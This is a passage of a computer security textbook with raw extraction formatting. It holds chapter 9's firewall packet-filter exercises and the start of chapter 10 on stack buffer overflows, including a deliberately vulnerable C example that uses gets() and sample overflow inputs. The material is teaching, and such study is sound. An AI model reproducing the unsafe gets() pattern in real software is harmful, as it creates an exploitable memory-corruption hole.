address that range from 192.168.1.0 to 192.168.1.254. Describe the effect of each rule.\\r\\n9.5 SMTP (Simple Mail Transfer Protocol) is the standard protocol for transferring mail \\r\\nbetween hosts over TCP. A TCP connection is set up between a user agent and a \\r\\nSource Address Souce Port Dest Address Dest Port Action\\r\\n1 Any Any 192.168.1.0 71023 Allow\\r\\n2 192.168.1.1 Any Any Any Deny\\r\\n3 Any Any 192.168.1.1 Any Deny\\r\\n4 192.168.1.0 Any Any Any Allow\\r\\n5 Any Any 192.168.1.2 SMTP Allow\\r\\n6 Any Any 192.168.1.3 HTTP Allow\\r\\n7 Any Any Any Any Deny\\r\\nTable 9.5 Sample Packet Filter Firewall Ruleset\\r\\nM09_STAL0611_04_GE_C09.indd 337 10/11/17 2:59 PM\\n\\n\\n338 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\nserver program. The server listens on TCP port 25 for incoming connection requests. \\r\\nThe user end of the connection is on a TCP port number above 1023. Suppose you \\r\\nwish to build a packet filter rule set allowing inbound and outbound SMTP traffic. \\r\\nYou generate the following rule set:\\r\\nRule Direction Src Addr Dest Addr Protocol Dest Port Action\\r\\nA In External Internal TCP 25 Permit\\r\\nB Out Internal External TCP 71023 Permit\\r\\nC Out Internal External TCP 25 Permit\\r\\nD In External Internal TCP 71023 Permit\\r\\nE Either Any Any Any Any Deny\\r\\na. Describe the effect of each rule.\\r\\nb. Your host in this example has IP address 172.16.1.1. Someone tries to send e-mail \\r\\nfrom a remote host with IP address 192.168.3.4. If successful, this generates an \\r\\nSMTP dialogue between the remote user and the SMTP server on your host \\r\\nconsisting of SMTP commands and mail. Additionally, assume a user on your host \\r\\ntries to send e-mail to the SMTP server on the remote system. Four typical packets \\r\\nfor this scenario are as shown:\\r\\nPacket Direction Src Addr Dest Addr Protocol Dest Port Action\\r\\n1 In 192.168.3.4 172.16.1.1 TCP 25 ?\\r\\n2 Out 172.16.1.1 192.168.3.4 TCP 1234 ?\\r\\n3 Out 172.16.1.1 192.168.3.4 TCP 25 ?\\r\\n4 In 192.168.3.4 172.16.1.1 TCP 1357 ?\\r\\nIndicate which packets are permitted or denied and which rule is used in each case.\\r\\nc. Someone from the outside world (10.1.2.3) attempts to open a connection from \\r\\nport 5150 on a remote host to the Web proxy server on port 8080 on one of your \\r\\nlocal hosts (172.16.3.4) in order to carry out an attack. Typical packets are as follows:\\r\\nPacket Direction Src Addr Dest Addr Protocol Dest Port Action\\r\\n5 In 10.1.2.3 172.16.3.4 TCP 8080 ?\\r\\n6 Out 172.16.3.4 10.1.2.3 TCP 5150 ?\\r\\nWill the attack succeed? Give details.\\r\\n9.6 To provide more protection, the rule set from the preceding problem is modified as \\r\\nfollows:\\r\\nRule Direction Src Addr Dest Addr Protocol Src Port Dest Port Action\\r\\nA In External Internal TCP 71023 25 Permit\\r\\nB Out Internal External TCP 25 71023 Permit\\r\\nC Out Internal External TCP 71023 25 Permit\\r\\nD In External Internal TCP 25 71023 Permit\\r\\nE Either Any Any Any Any Any Deny\\r\\nM09_STAL0611_04_GE_C09.indd 338 10/11/17 2:59 PM\\n\\n\\n9.8 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 339\\r\\na. Describe the change.\\r\\nb. Apply this new rule set to the same six packets of the preceding problem. Indicate \\r\\nwhich packets are permitted or denied and which rule is used in each case.\\r\\n9.7 A hacker uses port 25 as the client port on his or her end to attempt to open a connec\\ufffetion to your Web proxy server.\\r\\na. The following packets might be generated:\\r\\nPacket Direction Src Addr Dest Addr Protocol Src Port Dest Port Action\\r\\n7 In 10.1.2.3 172.16.3.4 TCP 25 8080 ?\\r\\n8 Out 172.16.3.4 10.1.2.3 TCP 8080 25 ?\\r\\nExplain why this attack will succeed, using the rule set of the preceding problem.\\r\\nb. When a TCP connection is initiated, the ACK bit in the TCP header is not set. \\r\\nSubsequently, all TCP headers sent over the TCP connection have the ACK bit set. \\r\\nUse this information to modify the rule set of the preceding problem to prevent \\r\\nthe attack just described.\\r\\n9.8 List the different types of malicious behavior that are addressed by HIPS in general \\r\\nand also the areas for which HIPS offer desktop protection.\\r\\n9.9 As was mentioned in Section 9.3, when a client wishes to establish a connection to \\r\\nan object that is reachable only via a firewall, it must open a TCP connection to the \\r\\nappropriate SOCKS port on the SOCKS server system. Even if the client wishes to \\r\\nsend UDP segments, first a TCP connection is opened. Moreover, UDP segments can \\r\\nbe forwarded only as long as the TCP connection remains opened. Why?\\r\\n9.10 Consider the threat of “theft/breach of proprietary or confidential information held in \\r\\nkey data files on the system.” One method by which such a breach might occur is the \\r\\naccidental/deliberate e-mailing of information to a user outside of the organization. \\r\\nA possible countermeasure to this is to require all external e-mail to be given a sen\\ufffesitivity tag (classification if you like) in its subject and for external e-mail to have the \\r\\nlowest sensitivity tag. Discuss how this measure could be implemented in a firewall \\r\\nand what components and architecture would be needed to do this.\\r\\n9.11 You are given the following “informal firewall policy” details to be implemented using \\r\\na firewall such as that in Figure 9.2:\\r\\n1. E-mail may be sent using SMTP in both directions through the firewall, but it must \\r\\nbe relayed via the DMZ mail gateway that provides header sanitization and con\\ufffetent filtering. External e-mail must be destined for the DMZ mail server.\\r\\n2. Users inside may retrieve their e-mail from the DMZ mail gateway, using either \\r\\nPOP3 or POP3S, and authenticate themselves.\\r\\n3. Users outside may retrieve their e-mail from the DMZ mail gateway, but only if \\r\\nthey use the secure POP3 protocol and authenticate themselves.\\r\\n4. Web requests (both insecure and secure) are allowed from any internal user out \\r\\nthrough the firewall but must be relayed via the DMZ Web proxy, which provides \\r\\ncontent filtering (noting this is not possible for secure requests), and users must \\r\\nauthenticate with the proxy for logging.\\r\\n5. Web requests (both insecure and secure) are allowed from anywhere on the Inter\\ufffenet to the DMZ Web server.\\r\\n6. DNS lookup requests by internal users are allowed via the DMZ DNS server, \\r\\nwhich queries to the Internet.\\r\\n7. External DNS requests are provided by the DMZ DNS server.\\r\\n8. Management and update of information on the DMZ servers is allowed using \\r\\nsecure shell connections from relevant authorized internal users (may have differ\\ufffeent sets of users on each system as appropriate).\\r\\nM09_STAL0611_04_GE_C09.indd 339 10/11/17 2:59 PM\\n\\n\\n340 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\n9. SNMP management requests are permitted from the internal management hosts \\r\\nto the firewalls, with the firewalls also allowed to send management traps (i.e., \\r\\nnotification of some event occurring) to the management hosts.\\r\\nDesign suitable packet filter rule sets (similar to those shown in Table 9.1) to be imple\\ufffemented on the “External Firewall” and the “Internal Firewall” to satisfy the afore\\ufffementioned policy requirements.\\r\\n9.12 We have an internal Web server, used only for testing purposes, at IP address 5.6.7.8 \\r\\non our internal corporate network. The packet filter is situated at a chokepoint \\r\\nbetween our internal network and the rest of the Internet. Can such a packet filter \\r\\nblock all attempts by outside hosts to initiate a direct TCP connection to this internal \\r\\nWeb server? If yes, design suitable packet filter rule sets (similar to those shown in \\r\\nTable 9.1) that provides this functionality; if no, explain why a (stateless) packet filter \\r\\ncannot do it.\\r\\n9.13 Explain the strengths and weaknesses of each of the following firewall deployment \\r\\nscenarios in defending servers, desktop machines, and laptops against network threats.\\r\\na. A firewall at the network perimeter.\\r\\nb. Firewalls on every end host machine.\\r\\nc. A network perimeter firewall and firewalls on every end host machine\\r\\n9.14 Consider the example Snort rule given in Chapter 8 to detect a SYN-FIN attack. \\r\\nAssuming this rule is used on a Snort Inline IPS, how would you modify the rule to \\r\\nblock such packets entering the home network?\\r\\n9.15 What is the Digital Immune System? Explain its characteristics in detail.\\r\\nM09_STAL0611_04_GE_C09.indd 340 10/11/17 2:59 PM\\n\\n\\nBuffer Overflow\\r\\nCHAPTER \\r\\nPart two: Software and System \\r\\nSecurity\\r\\n10.1 Stack Overflows\\r\\nBuffer Overflow Basics\\r\\nStack Buffer Overflows\\r\\nShellcode\\r\\n10.2 Defending Against Buffer Overflows\\r\\nCompile-Time Defenses\\r\\nRun-Time Defenses\\r\\n10.3 Other Forms of Overflow Attacks\\r\\nReplacement Stack Frame\\r\\nReturn to System Call\\r\\nHeap Overflows\\r\\nGlobal Data Area Overflows\\r\\nOther Types of Overflows\\r\\n10.4 Key Terms, Review Questions, and Problems\\r\\n341\\r\\nM10_STAL0611_04_GE_C10.indd 341 10/11/17 3:02 PM\\n\\n\\n342 CHAPTER 10 / BUFFER OVERFLOW\\r\\nIn this chapter, we turn our attention specifically to buffer overflow attacks. This \\r\\ntype of attack is one of the most common attacks seen and results from careless \\r\\nprogramming in applications. A look at the list of vulnerability advisories from \\r\\norganizations such as CERT or SANS continue to include a significant number of \\r\\nbuffer overflow or heap overflow exploits, including a number of serious, remotely \\r\\nexploitable vulnerabilities. Similarly, several of the items in the CWE/SANS Top 25 \\r\\nMost Dangerous Software Errors list, Risky Resource Management category, are \\r\\nbuffer overflow variants. These can result in exploits to both operating systems and \\r\\ncommon applications, and still comprise the majority of exploits in widely deployed \\r\\nexploit toolkits [VEEN12]. Yet this type of attack has been known since it was first \\r\\nwidely used by the Morris Internet Worm in 1988, and techniques for preventing \\r\\nits occurrence are well-known and documented. Table 10.1 provides a brief history \\r\\nof some of the more notable incidents in the history of buffer overflow exploits. \\r\\nUnfortunately, due to a legacy of buggy code in widely deployed operating systems \\r\\nand applications, a failure to patch and update many systems, and continuing care\\ufffeless programming practices by programmers, it is still a major source of concern to \\r\\nsecurity practitioners. This chapter focuses on how a buffer overflow occurs and \\r\\nwhat methods can be used to prevent or detect its occurrence.\\r\\nWe begin with an introduction to the basics of buffer overflow. Then, we \\r\\npresent details of the classic stack buffer overflow. This includes a discussion of \\r\\nhow functions store their local variables on the stack, and the consequence of \\r\\nattempting to store more data in them than there is space available. We continue \\r\\nwith an overview of the purpose and design of shellcode, which is the custom code \\r\\ninjected by an attacker and to which control is transferred as a result of the buffer \\r\\noverflow.\\r\\nNext, we consider ways of defending against buffer overflow attacks. We start \\r\\nwith the obvious approach of preventing them by not writing code that is vulner\\ufffeable to buffer overflows in the first place. However, given the large existing body \\r\\nof buggy code, we also need to consider hardware and software mechanisms that \\r\\ncan detect and thwart buffer overflow attacks. These include mechanisms to protect \\r\\nexecutable address space, techniques to detect stack modifications, and approaches \\r\\nthat randomize the address space layout to hinder successful execution of these \\r\\nattacks.\\r\\nFinally, we will briefly survey some of the other overflow techniques, including \\r\\nreturn to system call and heap overflows, and mention defenses against these.\\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Define what a buffer overflow is, and list possible consequences.\\r\\n◆ Describe how a stack buffer overflow works in detail.\\r\\n◆ Define shellcode and describe its use in a buffer overflow attack.\\r\\n◆ List various defenses against buffer overflow attacks.\\r\\n◆ List a range of other types of buffer overflow attacks.\\r\\nM10_STAL0611_04_GE_C10.indd 342 10/11/17 3:02 PM\\n\\n\\n10.1 / STACK OVERFLOWS 343\\r\\n10.1 STACK OVERFLOWS\\r\\nBuffer Overflow Basics\\r\\nA buffer overflow, also known as a buffer overrun or buffer overwrite, is defined in \\r\\nNISTIR 7298 (Glossary of Key Information Security Terms, May 2013) as follows:\\r\\n1988 The Morris Internet Worm uses a buffer overflow exploit in “fingerd” as one of its attack \\r\\nmechanisms.\\r\\n1995 A buffer overflow in NCSA httpd 1.3 was discovered and published on the Bugtraq \\r\\nmailing list by Thomas Lopatic.\\r\\n1996 Aleph One published “Smashing the Stack for Fun and Profit” in Phrack magazine, giving \\r\\na step by step introduction to exploiting stack-based buffer overflow vulnerabilities.\\r\\n2001 The Code Red worm exploits a buffer overflow in Microsoft IIS 5.0.\\r\\n2003 The Slammer worm exploits a buffer overflow in Microsoft SQL Server 2000.\\r\\n2004 The Sasser worm exploits a buffer overflow in Microsoft Windows 2000/XP Local Security \\r\\nAuthority Subsystem Service (LSASS).\\r\\nTable 10.1 A Brief History of Some Buffer Overflow Attacks\\r\\nBuffer Overrun: A condition at an interface under which more input can be placed \\r\\ninto a buffer or data holding area than the capacity allocated, overwriting other \\r\\ninformation. Attackers exploit such a condition to crash a system or to insert \\r\\nspecially crafted code that allows them to gain control of the system.\\r\\nA buffer overflow can occur as a result of a programming error when a process \\r\\nattempts to store data beyond the limits of a fixed-sized buffer and consequently \\r\\noverwrites adjacent memory locations. These locations could hold other program \\r\\nvariables or parameters or program control flow data such as return addresses and \\r\\npointers to previous stack frames. The buffer could be located on the stack, in the \\r\\nheap, or in the data section of the process. The consequences of this error include cor\\uffferuption of data used by the program, unexpected transfer of control in the program, \\r\\npossible memory access violations, and very likely eventual program termination. \\r\\nWhen done deliberately as part of an attack on a system, the transfer of control could \\r\\nbe to code of the attacker’s choosing, resulting in the ability to execute arbitrary code \\r\\nwith the privileges of the attacked process.\\r\\nTo illustrate the basic operation of a buffer overflow, consider the C main func\\ufffetion given in Figure 10.1a. This contains three variables (valid, str1, and str2),\\r\\n1\\r\\nwhose values will typically be saved in adjacent memory locations. The order and \\r\\n1\\r\\nIn this example, the flag variable is saved as an integer rather than a Boolean. This is done both because \\r\\nit is the classic C style, and to avoid issues of word alignment in its storage. The buffers are deliberately \\r\\nsmall to accentuate the buffer overflow issue being illustrated.\\r\\nM10_STAL0611_04_GE_C10.indd 343 10/11/17 3:02 PM\\n\\n\\n344 CHAPTER 10 / BUFFER OVERFLOW\\r\\nint main(int argc, char *argv[]) {\\r\\n int valid = FALSE;\\r\\n char str1[8];\\r\\n char str2[8];\\r\\n next_tag(str1);\\r\\n gets(str2);\\r\\n if (strncmp(str1, str2, 8) == 0)\\r\\n valid = TRUE;\\r\\n printf(\"buffer1: str1(%s), str2(%s), valid(%d)\\\\n\", str1, str2, valid);\\r\\n}\\r\\nFigure 10.1 Basic Buffer Overflow Example\\r\\n(a) Basic buffer overflow C code\\r\\n(b) Basic buffer overflow example runs\\r\\n$ cc -g -o buffer1 buffer1.c\\r\\n$ ./buffer1\\r\\nSTART\\r\\nbuffer1: str1(START), str2(START), valid(1)\\r\\n$ ./buffer1\\r\\nEVILINPUTVALUE\\r\\nbuffer1: str1(TVALUE), str2(EVILINPUTVALUE), valid(0)\\r\\n$ ./buffer1\\r\\nBADINPUTBADINPUT\\r\\nbuffer1: str1(BADINPUT), str2(BADINPUTBADINPUT), valid(1)\\r\\nlocation of these will depend on the type of variable (local or global), the language \\r\\nand compiler used, and the target machine architecture. However, for the purpose of \\r\\nthis example, we will assume they are saved in consecutive memory locations, from \\r\\nhighest to lowest, as shown in Figure 10.2.2\\r\\n This will typically be the case for local \\r\\nvariables in a C function on common processor architectures such as the Intel Pen\\ufffetium family. The purpose of the code fragment is to call the function next_\\r\\ntag(str1) to copy into str1 some expected tag value. Let us assume this will be \\r\\nthe string START. It then reads the next line from the standard input for the program \\r\\nusing the C library gets() function then compares the string read with the expected \\r\\ntag. If the next line did indeed contain just the string START, this comparison would \\r\\nsucceed, and the variable VALID would be set to TRUE.\\r\\n3\\r\\n This case is shown in the first \\r\\n2\\r\\nAddress and data values are specified in hexadecimal in this and related figures. Data values are also \\r\\nshown in ASCII where appropriate.\\r\\n3\\r\\nIn C, the logical values FALSE and TRUE are simply integers with the values 0 and 1 (or indeed any non\\ufffezero value), respectively. Symbolic defines are often used to map these symbolic names to their underlying \\r\\nvalue, as was done in this program.\\r\\nM10_STAL0611_04_GE_C10.indd 344 10/11/17 3:02 PM\\n\\n\\n10.1 / STACK OVERFLOWS 345\\r\\nof the three example program runs in Figure 10.1b.4\\r\\n Any other input tag would leave \\r\\nit with the value FALSE. Such a code fragment might be used to parse some struc\\ufffetured network protocol interaction or formatted text file.\\r\\nThe problem with this code exists because the traditional C library gets()\\r\\nfunction does not include any checking on the amount of data copied. It will read \\r\\nthe next line of text from the program’s standard input up until the first newline5\\r\\ncharacter occurs and copy it into the supplied buffer followed by the NULL termi\\ufffenator used with C strings.6\\r\\n If more than seven characters are present on the input \\r\\nline, when read in they will (along with the terminating NULL character) require \\r\\n4\\r\\nThis and all subsequent examples in this chapter were created using an older Knoppix Linux system run\\ufffening on a Pentium processor, using the GNU GCC compiler and GDB debugger.\\r\\n5\\r\\nThe newline (NL) or linefeed (LF) character is the standard end of line terminator for UNIX systems, \\r\\nand hence for C, and is the character with the ASCII value 0x0a.\\r\\n6\\r\\nStrings in C are stored in an array of characters and terminated with the NULL character, which has the \\r\\nASCII value 0x00. Any remaining locations in the array are undefined, and typically contain whatever \\r\\nvalue was previously saved in that area of memory. This can be clearly seen in the value of the variable \\r\\nstr2 in the “Before” column of Figure 10.2.\\r\\nFigure 10.2 Basic Buffer Overflow Stack Values\\r\\n01000000\\r\\n . . . .\\r\\n34fcffbf\\r\\n 4 . . .\\r\\n . . . .\\r\\n . . . .\\r\\nc6bd0340\\r\\n . . . @\\r\\n08fcffbf\\r\\n . . . .\\r\\n00000000\\r\\n . . . .\\r\\n80640140\\r\\n . d . @\\r\\n54001540\\r\\n T . . @\\r\\n53544152\\r\\n S T A R\\r\\n00850408\\r\\n . . . .\\r\\n30561540\\r\\nbffffbf0\\r\\nbffffbf4\\r\\n. . . . \\r\\n . . . .\\r\\nbffffbec\\r\\nbffffbe8\\r\\nbffffbe4\\r\\nbffffbe0\\r\\nbffffbdc\\r\\nbffffbd8\\r\\nbffffbd4\\r\\nbffffbd0\\r\\n 0 V . @\\r\\n01000000\\r\\n . . . .\\r\\n34fcffbf\\r\\n 3 . . .\\r\\n. . . .\\r\\nAfter\\r\\ngets(str2)\\r\\nBefore\\r\\ngets(str2)\\r\\nMemory\\r\\nAddress\\r\\n . . . .\\r\\nc6bd0340\\r\\n . . . @\\r\\n08fcffbf\\r\\n . . . .\\r\\n01000000\\r\\n . . . .\\r\\n00640140\\r\\n . d . @\\r\\n4e505554\\r\\n N P U T\\r\\n42414449\\r\\n B A D I\\r\\n4e505554\\r\\n N P U T\\r\\n42414449\\r\\n B A D I\\r\\nargc\\r\\nargv\\r\\nContains\\r\\nvalue of\\r\\nreturn addr\\r\\nold base ptr\\r\\nvalid\\r\\nstr1[4-7]\\r\\nstr1[0-3]\\r\\nstr2[4-7]\\r\\nstr2[0-3]\\r\\nM10_STAL0611_04_GE_C10.indd 345 10/11/17 3:02 PM\\n\\n\\n346 CHAPTER 10 / BUFFER OVERFLOW\\r\\nmore room than is available in the str2 buffer. Consequently, the extra characters \\r\\nwill proceed to overwrite the values of the adjacent variable, str1 in this case. For \\r\\nexample, if the input line contained EVILINPUTVALUE, the result will be that str1\\r\\nwill be overwritten with the characters TVALUE, and str2 will use not only the eight \\r\\ncharacters allocated to it, but seven more from str1 as well. This can be seen in the \\r\\nsecond example run in Figure 10.1b. The overflow has resulted in corruption of a vari\\ufffeable not directly used to save the input. Because these strings are not equal, valid\\r\\nalso retains the value FALSE. Further, if 16 or more characters were input, additional \\r\\nmemory locations would be overwritten.\\r\\nThe preceding example illustrates the basic behavior of a buffer overflow. \\r\\nAt its simplest, any unchecked copying of data into a buffer could result in cor\\uffferuption of adjacent memory locations, which may be other variables, or, as we will \\r\\nsee next, possibly program control addresses and data. Even this simple example \\r\\ncould be taken further. Knowing the structure of the code processing it, an attacker \\r\\ncould arrange for the overwritten value to set the value in str1 equal to the value \\r\\nplaced in str2, resulting in the subsequent comparison succeeding. For example, the \\r\\ninput line could be the string BADINPUTBADINPUT. This results in the comparison \\r\\nsucceeding, as shown in the third of the three example program runs in Figure 10.1b \\r\\nand illustrated in Figure 10.2, with the values of the local variables before and after \\r\\nthe call to gets(). Note also the terminating NULL for the input string was writ\\ufffeten to the memory location following str1. This means the flow of control in the \\r\\nprogram will continue as if the expected tag was found, when in fact the tag read was \\r\\nsomething completely different. This will almost certainly result in program behavior \\r\\nthat was not intended. How serious is this will depend very much on the logic in the \\r\\nattacked program. One dangerous possibility occurs if instead of being a tag, the \\r\\nvalues in these buffers were an expected and supplied password needed to access \\r\\nprivileged features. If so, the buffer overflow provides the attacker with a means of \\r\\naccessing these features without actually knowing the correct password.\\r\\nTo exploit any type of buffer overflow, such as those we have illustrated here, \\r\\nthe attacker needs:\\r\\n1. To identify a buffer overflow vulnerability in some program that can be \\r\\ntriggered using externally sourced data under the attackers control, and\\r\\n2. To understand how that buffer will be stored in the processes memory, and \\r\\nhence the potential for corrupting adjacent memory locations and potentially \\r\\naltering the flow of execution of the program.\\r\\nIdentifying vulnerable programs may be done by inspection of program source, \\r\\ntracing the execution of programs as they process oversized input, or using tools such \\r\\nas fuzzing, which we will discuss in Section 11.2, to automatically identify potentially \\r\\nvulnerable programs. What the attacker does with the resulting corruption of memory \\r\\nvaries considerably, depending on what values are being overwritten. We will explore \\r\\nsome of the alternatives in the following sections.\\r\\nBefore exploring buffer overflows further, it is worth considering just how the \\r\\npotential for their occurrence developed and why programs are not necessarily pro\\ufffetected from such errors. To understand this, we need to briefly consider the history of \\r\\nprogramming languages and the fundamental operation of computer systems. At the \\r\\nbasic machine level, all of the data manipulated by machine instructions executed by \\r\\nM10_STAL0611_04_GE_C10.indd 346 10/11/17 3:02 PM\\n\\n\\n10.1 / STACK OVERFLOWS 347\\r\\nthe computer processor are stored in either the processor’s registers or in memory. \\r\\nThe data are simply arrays of bytes. Their interpretation is entirely determined by the \\r\\nfunction of the instructions accessing them. Some instructions will treat the bytes as \\r\\nrepresenting integer values, others as addresses of data or instructions, and others as \\r\\narrays of characters. There is nothing intrinsic in the registers or memory that indicates \\r\\nthat some locations have an interpretation different from others. Thus, the responsibil\\ufffeity is placed on the assembly language programmer to ensure that the correct inter\\ufffepretation is placed on any saved data value. The use of assembly (and hence machine) \\r\\nlanguage programs gives the greatest access to the resources of the computer system, \\r\\nbut at the highest cost and responsibility in coding effort for the programmer.\\r\\nAt the other end of the abstraction spectrum, modern high-level programming \\r\\nlanguages such as Java, ADA, Python, and many others have a very strong notion \\r\\nof the type of variables and what constitutes permissible operations on them. Such \\r\\nlanguages do not suffer from buffer overflows because they do not permit more data \\r\\nto be saved into a buffer than it has space for. The higher levels of abstraction, and \\r\\nsafe usage features of these languages, mean programmers can focus more on solving \\r\\nthe problem at hand and less on managing details of interactions with variables. But \\r\\nthis flexibility and safety comes at a cost in resource use, both at compile time, and in \\r\\nadditional code that must executed at run time to impose checks such as that on buffer \\r\\nlimits. The distance from the underlying machine language and architecture also means \\r\\nthat access to some instructions and hardware resources is lost. This limits their use\\ufffefulness in writing code, such as device drivers, that must interact with such resources.\\r\\nIn between these extremes are languages such as C and its derivatives, which \\r\\nhave many modern high-level control structures and data type abstractions but which \\r\\nstill provide the ability to access and manipulate memory data directly. The C program\\ufffeming language was designed by Dennis Ritchie, at Bell Laboratories, in the early 1970s. \\r\\nIt was used very early to write the UNIX operating system and many of the applica\\ufffetions that run on it. Its continued success was due to its ability to access low-level \\r\\nmachine resources while still having the expressiveness of high-level control and data \\r\\nstructures and because it was fairly easily ported to a wide range of processor architec\\ufffetures. It is worth noting that UNIX was one of the earliest operating systems written in \\r\\na high-level language. Up until then (and indeed in some cases for many years after), \\r\\noperating systems were typically written in assembly language, which limited them to \\r\\na specific processor architecture. Unfortunately, the ability to access low-level machine \\r\\nresources means that the language is susceptible to inappropriate use of memory con\\ufffetents. This was aggravated by the fact that many of the common and widely used library \\r\\nfunctions, especially those relating to input and processing of strings, failed to perform \\r\\nchecks on the size of the buffers being used. Because these functions were common \\r\\nand widely used, and because UNIX and derivative operating systems such as Linux \\r\\nare widely deployed, this means there is a large legacy body of code using these unsafe \\r\\nfunctions, which are thus potentially vulnerable to buffer overflows. We return to this \\r\\nissue when we discuss countermeasures for managing buffer overflows.\\r\\nStack Buffer Overflows\\r\\nA stack buffer overflow occurs when the targeted buffer is located on the stack, usu\\ufffeally as a local variable in a function’s stack frame. This form of attack is also referred \\r\\nto as stack smashing. Stack buffer overflow attacks have been exploited since first \\r\\nM10_STAL0611_04_GE_C10.indd 347 10/11/17 3:02 PM\\n\\n\\n348 CHAPTER 10 / BUFFER OVERFLOW\\r\\nbeing seen in the wild in the Morris Internet Worm in 1988. The exploits it used \\r\\nincluded an unchecked buffer overflow resulting from the use of the C gets()\\r\\nfunction in the fingerd daemon. The publication by Aleph One (Elias Levy) of \\r\\ndetails of the attack and how to exploit it [LEVY96] hastened further use of this \\r\\ntechnique. As indicated in the chapter introduction, stack buffer overflows are still \\r\\nbeing exploited, as new vulnerabilities continue to be discovered in widely deployed \\r\\nsoftware.\\r\\nFUNCTION CALL MECHANISMS To better understand how buffer overflows work, we \\r\\nfirst take a brief digression into the mechanisms used by program functions to manage \\r\\ntheir local state on each call. When one function calls another, at the very least it needs \\r\\nsomewhere to save the return address so the called function can return control when \\r\\nit finishes. Aside from that, it also needs locations to save the parameters to be passed \\r\\nin to the called function, and also possibly to save register values that it wishes to \\r\\ncontinue using when the called function returns. All of these data are usually saved \\r\\non the stack in a structure known as a stack frame. The called function also needs \\r\\nlocations to save its local variables, somewhere different for every call so it is possible \\r\\nfor a function to call itself either directly or indirectly. This is known as a recursive \\r\\nfunction call.7\\r\\n In most modern languages, including C, local variables are also stored \\r\\nin the function’s stack frame. One further piece of information then needed is some \\r\\nmeans of chaining these frames together, so as a function is exiting it can restore the \\r\\nstack frame for the calling function before transferring control to the return address. \\r\\nFigure 10.3 illustrates such a stack frame structure. The general process of one \\r\\n7\\r\\nThough early programming languages such as Fortran did not do this, and as a consequence Fortran \\r\\nfunctions could not be called recursively.\\r\\nFigure 10.3 Example Stack Frame with Functions P and Q\\r\\nP:\\r\\nQ:\\r\\nReturn addr\\r\\nReturn addr in P\\r\\nOld frame pointer\\r\\nOld frame pointer Frame\\r\\npointer\\r\\nStack\\r\\npointer\\r\\nparam 2\\r\\nparam 1\\r\\nlocal 1\\r\\nlocal 2\\r\\nM10_STAL0611_04_GE_C10.indd 348 10/11/17 3:02 PM\\n\\n\\n10.1 / STACK OVERFLOWS 349\\r\\nfunction P calling another function Q can be summarized as follows. The calling \\r\\nfunction P:\\r\\n1. Pushes the parameters for the called function onto the stack (typically in \\r\\nreverse order of declaration).\\r\\n2. Executes the call instruction to call the target function, which pushes the return \\r\\naddress onto the stack.\\r\\nThe called function Q:\\r\\n3. Pushes the current frame pointer value (which points to the calling routine’s \\r\\nstack frame) onto the stack.\\r\\n4. Sets the frame pointer to be the current stack pointer value (i.e., the address of \\r\\nthe old frame pointer), which now identifies the new stack frame location for the \\r\\ncalled function.\\r\\n5. Allocates space for local variables by moving the stack pointer down to leave \\r\\nsufficient room for them.\\r\\n6. Runs the body of the called function.\\r\\n7. As it exits, it first sets the stack pointer back to the value of the frame pointer \\r\\n(effectively discarding the space used by local variables).\\r\\n8. Pops the old frame pointer value (restoring the link to the calling routine’s \\r\\nstack frame).\\r\\n9. Executes the return instruction which pops the saved address off the stack and \\r\\nreturns control to the calling function.\\r\\nLastly, the calling function:\\r\\n10. Pops the parameters for the called function off the stack.\\r\\n11. Continues execution with the instruction following the function call.\\r\\nAs has been indicated before, the precise implementation of these steps is language, \\r\\ncompiler, and processor architecture dependent. However, something similar will usu\\ufffeally be found in most cases. In addition, not specified here are steps involving saving \\r\\nregisters used by the calling or called functions. These generally happen either before \\r\\nthe parameter pushing if done by the calling function, or after the allocation of space \\r\\nfor local variables if done by the called function. In either case, this does not affect the \\r\\noperation of buffer overflows we will discuss next. More detail on function call and return \\r\\nmechanisms and the structure and use of stack frames may be found in [STAL16b].\\r\\nSTACK OVERFLOW EXAMPLE With the preceding background, consider the effect of \\r\\nthe basic buffer overflow introduced in Section 10.1. Because the local variables are \\r\\nplaced below the saved frame pointer and return address, the possibility exists of exploit\\ufffeing a local buffer variable overflow vulnerability to overwrite the values of one or both \\r\\nof these key function linkage values. Note that the local variables are usually allocated \\r\\nspace in the stack frame in order of declaration, growing down in memory with the top \\r\\nof stack. Compiler optimization can potentially change this, so the actual layout will \\r\\nneed to be determined for any specific program of interest. This possibility of overwrit\\ufffeing the saved frame pointer and return address forms the core of a stack overflow attack.\\r\\nM10_STAL0611_04_GE_C10.indd 349 10/11/17 3:02 PM\\n\\n\\n350 CHAPTER 10 / BUFFER OVERFLOW\\r\\nAt this point, it is useful to step back and take a somewhat wider view of a \\r\\nrunning program, and the placement of key regions such as the program code, global \\r\\ndata, heap, and stack. When a program is run, the operating system typically creates \\r\\na new process for it. The process is given its own virtual address space, with a general \\r\\nstructure as shown in Figure 10.4. This consists of the contents of the executable \\r\\nprogram file (including global data, relocation table, and actual program code seg\\ufffements) near the bottom of this address space, space for the program heap to then \\r\\ngrow upward from above the code, and room for the stack to grow down from near \\r\\nthe middle (if room is reserved for kernel space in the upper half) or top. The stack \\r\\nframes we discussed are hence placed one below another in the stack area, as the \\r\\nstack grows downward through memory. We return to discuss some of the other \\r\\ncomponents later. Further details on the layout of a process address space may be \\r\\nfound in [STAL16c].\\r\\nFigure 10.4 Program Loading into Process Memory\\r\\nGlobal data Global data\\r\\nHeap\\r\\nSpare\\r\\nmemory\\r\\nStack\\r\\nKernel\\r\\ncode\\r\\nand\\r\\ndata\\r\\nTop of memory\\r\\nProcess image in\\r\\nmain memory\\r\\nProgram f ile\\r\\nProgram\\r\\nmachine\\r\\ncode\\r\\nProgram\\r\\nmachine\\r\\ncode\\r\\nProcess control block\\r\\nBottom of memory\\r\\nM10_STAL0611_04_GE_C10.indd 350 10/11/17 3:02 PM\\n\\n\\n10.1 / STACK OVERFLOWS 351\\r\\nTo illustrate the operation of a classic stack overflow, consider the C func\\ufffetion given in Figure 10.5a. It contains a single local variable, the buffer inp. This \\r\\nis saved in the stack frame for this function, located somewhere below the saved \\r\\nframe pointer and return address, as shown in Figure 10.6. This hello function (a \\r\\nversion of the classic Hello World program) prompts for a name, which it then reads \\r\\ninto the buffer inp using the unsafe gets() library routine. It then displays the \\r\\nvalue read using the printf() library routine. As long as a small value is read in, \\r\\nthere will be no problems and the program calling this function will run success\\ufffefully, as shown in the first of the example program runs in Figure 10.5b. However, 